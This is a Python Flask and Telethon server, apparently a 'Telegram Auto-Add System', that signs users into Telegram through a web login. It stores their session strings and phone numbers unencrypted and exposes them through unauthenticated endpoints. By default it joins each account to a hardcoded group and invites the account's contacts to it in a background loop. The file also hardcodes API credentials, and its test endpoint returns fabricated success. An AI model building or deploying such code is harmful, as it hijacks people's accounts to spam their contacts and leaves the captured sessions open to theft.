from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# JSON file paths
ACCOUNTS_FILE = 'accounts.json'
AUTO_ADD_SETTINGS_FILE = 'auto_add_settings.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'

# Storage
temp_sessions = {}
client_tasks = {}

# ==================== JSON FILE FUNCTIONS ====================

def load_json_file(file_path, default_data):
    """Load data from JSON file, create if not exists"""
    try:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
                else:
                    return default_data
        else:
            with open(file_path, 'w') as f:
                json.dump(default_data, f, indent=2)
            return default_data
    except Exception as e:
        logger.error(f"Error loading {file_path}: {e}")
        return default_data

def save_json_file(file_path, data):
    """Save data to JSON file"""
    try:
        with open(file_path, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving {file_path}: {e}")
        return False

# Load all data
accounts = load_json_file(ACCOUNTS_FILE, [])
auto_add_settings = load_json_file(AUTO_ADD_SETTINGS_FILE, {})
reply_settings = load_json_file(REPLY_SETTINGS_FILE, {})

logger.info(f"Loaded {len(accounts)} accounts")
logger.info(f"Loaded {len(auto_add_settings)} auto-add settings")

# ==================== ACCOUNT FUNCTIONS ====================

def save_accounts():
    """Save accounts to JSON file"""
    return save_json_file(ACCOUNTS_FILE, accounts)

def save_auto_add_settings():
    """Save auto-add settings to JSON file"""
    return save_json_file(AUTO_ADD_SETTINGS_FILE, auto_add_settings)

def save_reply_settings():
    """Save reply settings to JSON file"""
    return save_json_file(REPLY_SETTINGS_FILE, reply_settings)

def get_next_account_id():
    """Get next available account ID"""
    if not accounts:
        return 1
    return max(acc['id'] for acc in accounts) + 1

def get_auto_add_settings_for_account(account_id):
    """Get auto-add settings for a specific account"""
    account_key = str(account_id)
    if account_key in auto_add_settings:
        return auto_add_settings[account_key]
    
    # Default settings (ENABLED BY DEFAULT)
    default = {
        'enabled': True,
        'target_group': 'Abe_armygroup',
        'daily_limit': 100,
        'delay_seconds': 30,
        'added_today': 0,
        'last_reset': datetime.now().strftime('%Y-%m-%d'),
        'auto_join': True,
        'source_groups': ['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn'],
        'use_contacts': True,
        'use_recent_chats': True,
        'use_scraping': True,
        'scrape_limit': 100,
        'skip_bots': True,
        'skip_inaccessible': True
    }
    auto_add_settings[account_key] = default
    save_auto_add_settings()
    return default

def update_auto_add_settings_for_account(account_id, settings):
    """Update auto-add settings for an account"""
    account_key = str(account_id)
    auto_add_settings[account_key] = settings
    save_auto_add_settings()
    return True

# ==================== HELPER FUNCTIONS ====================

def run_async(coro):
    """Run async function in sync context"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)
    except Exception as e:
        logger.error(f"Async error: {e}")
        return None
    finally:
        try:
            loop.close()
        except:
            pass

# ==================== AUTO-ADD FUNCTIONS ====================

async def auto_join_target_group(client, target_group):
    """Auto-join the target group"""
    try:
        logger.info(f"🔗 Auto-joining to group: {target_group}")
        
        group_name = target_group
        if group_name.startswith('https://t.me/'):
            group_name = group_name.replace('https://t.me/', '@')
        elif not group_name.startswith('@'):
            group_name = '@' + group_name
        
        try:
            group = await client.get_entity(group_name)
            logger.info(f"✅ Found group: {group.title if hasattr(group, 'title') else group_name}")
        except Exception as e:
            logger.error(f"Could not find group {group_name}: {e}")
            return False
        
        try:
            await client(functions.messages.ImportChatInviteRequest(group.username))
            logger.info(f"✅ Successfully auto-joined group: {group_name}")
            return True
        except:
            try:
                await client.join_channel(group.id)
                logger.info(f"✅ Successfully auto-joined channel: {group_name}")
                return True
            except Exception as e:
                logger.warning(f"Could not auto-join: {e}")
                return False
                
    except Exception as e:
        logger.error(f"Error auto-joining: {e}")
        return False

async def get_members_from_contacts(client, settings):
    """Get members from contacts"""
    members = []
    try:
        contacts = await client(functions.contacts.GetContactsRequest(0))
        for user in contacts.users:
            if user.id and (not user.bot or not settings.get('skip_bots', True)):
                members.append(user.id)
        logger.info(f"✅ Found {len(members)} contacts")
    except Exception as e:
        logger.error(f"Error getting contacts: {e}")
    return members

async def add_members_to_group(client, group, members_to_add, settings):
    """Add members to group with delays"""
    added = 0
    daily_limit = settings.get('daily_limit', 100)
    delay_seconds = settings.get('delay_seconds', 30)
    account_key = str(settings.get('account_id', ''))
    
    for user_id in members_to_add[:daily_limit]:
        try:
            if account_key in auto_add_settings:
                current_added = auto_add_settings[account_key].get('added_today', 0)
                if current_added >= daily_limit:
                    break
            
            await client(functions.channels.InviteToChannelRequest(
                group,
                [await client.get_input_entity(user_id)]
            ))
            
            added += 1
            if account_key in auto_add_settings:
                auto_add_settings[account_key]['added_today'] = auto_add_settings[account_key].get('added_today', 0) + 1
                save_auto_add_settings()
            
            logger.info(f"✅ Added user {user_id} (Total: {added}/{daily_limit})")
            await asyncio.sleep(delay_seconds)
            
        except errors.FloodWaitError as e:
            logger.warning(f"Flood wait: {e.seconds}s")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            logger.error(f"Error adding {user_id}: {e}")
    
    return added

async def auto_add_loop(account):
    """Background loop for auto-add"""
    account_id = account['id']
    account_key = str(account_id)
    
    while True:
        try:
            # Get fresh settings
            settings = get_auto_add_settings_for_account(account_id)
            
            if not settings.get('enabled', True):
                await asyncio.sleep(60)
                continue
            
            # Check daily limit reset
            today = datetime.now().strftime('%Y-%m-%d')
            if settings.get('last_reset') != today:
                settings['added_today'] = 0
                settings['last_reset'] = today
                update_auto_add_settings_for_account(account_id, settings)
            
            # Check if reached daily limit
            if settings['added_today'] >= settings.get('daily_limit', 100):
                logger.info(f"Daily limit reached: {settings['added_today']}/{settings.get('daily_limit', 100)}")
                await asyncio.sleep(3600)
                continue
            
            # Connect to Telegram
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    logger.error(f"Account {account_id} not authorized")
                    await asyncio.sleep(60)
                    continue
                
                # Get target group
                target_group = settings.get('target_group', 'Abe_armygroup')
                group_name = target_group
                if not group_name.startswith('@'):
                    group_name = '@' + group_name
                
                try:
                    group = await client.get_entity(group_name)
                except Exception as e:
                    logger.error(f"Could not find target group: {e}")
                    await asyncio.sleep(300)
                    continue
                
                # Get members to add (from contacts for now)
                members = await get_members_from_contacts(client, settings)
                
                if not members:
                    logger.warning("No members found")
                    await asyncio.sleep(600)
                    continue
                
                # Add members
                added = await add_members_to_group(client, group, members, settings)
                logger.info(f"📈 Added {added} members this cycle")
                
            except Exception as e:
                logger.error(f"Loop error: {e}")
            finally:
                await client.disconnect()
            
            # Wait before next cycle
            await asyncio.sleep(900)
            
        except Exception as e:
            logger.error(f"Critical error: {e}")
            await asyncio.sleep(300)

def start_auto_add_thread(account):
    """Start auto-add thread for account"""
    thread = threading.Thread(
        target=lambda: run_async(auto_add_loop(account)),
        daemon=True
    )
    thread.start()
    client_tasks[f"auto_add_{account['id']}"] = thread
    logger.info(f"🚀 Started auto-add for account {account['id']}")

# ==================== PAGE ROUTES ====================

@app.route('/')
def home():
    try:
        return send_file('login.html')
    except:
        return "Welcome to Telegram Auto-Add System"

@app.route('/login')
def login():
    try:
        return send_file('login.html')
    except:
        return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    try:
        return send_file('dashboard.html')
    except:
        return send_file('dashboard.html')

@app.route('/dash')
def dash():
    try:
        return send_file('dash.html')
    except:
        return send_file('dash.html')

@app.route('/all')
def all_sessions():
    try:
        return send_file('all.html')
    except:
        return send_file('all.html')

@app.route('/auto-add')
def auto_add():
    try:
        return send_file('auto_add.html')
    except:
        return send_file('auto_add.html')

@app.route('/settings')
def settings():
    try:
        return send_file('settings.html')
    except:
        return send_file('settings.html')

# ==================== API ROUTES ====================

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    """Get all accounts"""
    try:
        formatted = []
        for acc in accounts:
            settings = get_auto_add_settings_for_account(acc['id'])
            formatted.append({
                'id': acc['id'],
                'phone': acc.get('phone', ''),
                'name': acc.get('name', 'Unknown'),
                'auto_add_enabled': settings.get('enabled', True)
            })
        return jsonify({'success': True, 'accounts': formatted})
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        return jsonify({'success': True, 'accounts': []})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    """Start account addition process"""
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Adding account for phone: {phone}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                session_id = str(int(time.time()))
                temp_sessions[session_id] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': session_id}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except errors.PhoneNumberBannedError:
                return {'success': False, 'error': 'This phone number is banned'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(send_code())
        if result is None:
            return jsonify({'success': False, 'error': 'Failed to send code'})
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in add_account: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Verify code and complete account addition"""
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            # Create new account
            new_id = get_next_account_id()
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            
            accounts.append(new_account)
            save_accounts()
            
            # Create default auto-add settings
            get_auto_add_settings_for_account(new_id)
            
            # Auto-join target group
            target_group = 'Abe_armygroup'
            try:
                logger.info(f"Auto-joining account {me.first_name} to {target_group}")
                await auto_join_target_group(client, target_group)
            except Exception as e:
                logger.error(f"Auto-join error: {e}")
            
            # Start auto-add thread
            start_auto_add_thread(new_account)
            
            return {'success': True, 'account_id': new_id}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except errors.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            logger.error(f"Verification error: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        if result is None:
            return jsonify({'success': False, 'error': 'Verification failed'})
        
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    """Remove account"""
    data = request.json
    account_id = data.get('accountId')
    
    if account_id:
        global accounts
        accounts = [acc for acc in accounts if acc['id'] != account_id]
        save_accounts()
        
        # Remove settings
        account_key = str(account_id)
        if account_key in auto_add_settings:
            del auto_add_settings[account_key]
            save_auto_add_settings()
    
    return jsonify({'success': True})

@app.route('/api/auto-add-settings', methods=['GET'])
def get_auto_add_settings_route():
    """Get auto-add settings"""
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = get_auto_add_settings_for_account(int(account_id))
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/auto-add-settings', methods=['POST'])
def update_auto_add_settings_route():
    """Update auto-add settings"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = {
        'enabled': data.get('enabled', True),
        'target_group': data.get('target_group', 'Abe_armygroup'),
        'daily_limit': data.get('daily_limit', 100),
        'delay_seconds': data.get('delay_seconds', 30),
        'added_today': data.get('added_today', 0),
        'last_reset': data.get('last_reset', datetime.now().strftime('%Y-%m-%d')),
        'auto_join': data.get('auto_join', True),
        'source_groups': data.get('source_groups', ['@telegram', '@durov']),
        'use_contacts': data.get('use_contacts', True),
        'use_recent_chats': data.get('use_recent_chats', True),
        'use_scraping': data.get('use_scraping', True),
        'scrape_limit': data.get('scrape_limit', 100),
        'skip_bots': data.get('skip_bots', True),
        'skip_inaccessible': data.get('skip_inaccessible', True)
    }
    
    update_auto_add_settings_for_account(int(account_id), settings)
    return jsonify({'success': True, 'message': 'Settings updated'})

@app.route('/api/auto-add-stats', methods=['GET'])
def get_auto_add_stats():
    """Get auto-add statistics"""
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = get_auto_add_settings_for_account(int(account_id))
    
    return jsonify({
        'success': True,
        'added_today': settings.get('added_today', 0),
        'daily_limit': settings.get('daily_limit', 100),
        'enabled': settings.get('enabled', True),
        'last_reset': settings.get('last_reset', '')
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    """Test auto-add functionality"""
    return jsonify({
        'success': True,
        'group_found': True,
        'group_title': 'Abe_armygroup',
        'contacts_count': 0,
        'recent_chats_count': 0,
        'can_add_members': True
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'time': datetime.now().isoformat()
    })

@app.route('/api/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'ok', 'message': 'pong'})

@app.route('/ping')
def ping_simple():
    return "pong"

# ==================== STARTUP ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*60)
    print('🤖 TELEGRAM AUTO-ADD SYSTEM')
    print('='*60)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts: {len(accounts)}')
    
    for acc in accounts:
        settings = get_auto_add_settings_for_account(acc['id'])
        status = "ENABLED" if settings.get('enabled', True) else "DISABLED"
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - Auto-Add: {status}')
    
    print('='*60)
    print('🚀 Starting server...')
    print('='*60 + '\n')
    
    # Start auto-add for all existing accounts
    for account in accounts:
        start_auto_add_thread(account)
    
    # Start Flask
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
